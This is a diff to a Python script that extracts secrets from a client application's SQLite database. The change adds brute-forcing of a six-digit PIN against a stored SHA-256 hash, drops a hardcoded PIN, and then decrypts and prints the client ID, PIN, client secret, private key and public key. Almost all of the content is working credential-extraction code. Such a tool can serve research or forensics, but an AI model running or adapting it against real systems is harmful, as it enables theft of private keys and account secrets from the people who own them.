@@ -5,9 +5,10 @@ import sqlite3
 import argparse
 import os
 
+
 parser = argparse.ArgumentParser()
 parser.add_argument("database", help="Client database to extract private key from")
-parser.add_argument("-o", "--output", help="File to dump extracted private key into")
+parser.add_argument("-p", "--pin", help="Known client pin", type=str)
 args = parser.parse_args()
 
 
@@ -26,7 +27,17 @@ try:
 except:
     pass
 
-client_pin = b'412270'
+if args.pin is None:
+    checkpin = data['checkpin']
+    for i in [str(i).encode() for i in range(1000000)]:
+        if hashlib.sha256(i).digest() == checkpin:
+            client_pin = i
+            break
+else:
+    client_pin = args.pin.encode()
+
+# client_pin = b'412270'
+
 key = hashlib.pbkdf2_hmac(
             hash_name='sha256',
             password=client_pin,
@@ -36,11 +47,13 @@ key = hashlib.pbkdf2_hmac(
 
 cip = AES.new(key=key, mode=AES.MODE_ECB)
 privkey = cip.decrypt(data['privkey']).decode()
-privkey = ''.join([i for i in privkey if i in string.printable[:-2]])
+privkey = ''.join(filter(lambda x: x in string.printable, privkey))
 
-if args.output is not None:
-    with open(args.output, "w") as f:
-        f.write(privkey)
-else:
-    print(privkey)
+csecret = cip.decrypt(data['csecret']).decode()
+csecret = ''.join(filter(lambda x: x in string.printable, csecret))
+print(f"cid: {data['cid']}\n")
+print(f"Pin: {client_pin.decode()}\n")
+print(f"Client Secret: {csecret}\n")
+print(privkey)
+print(data['pubkey'])
 
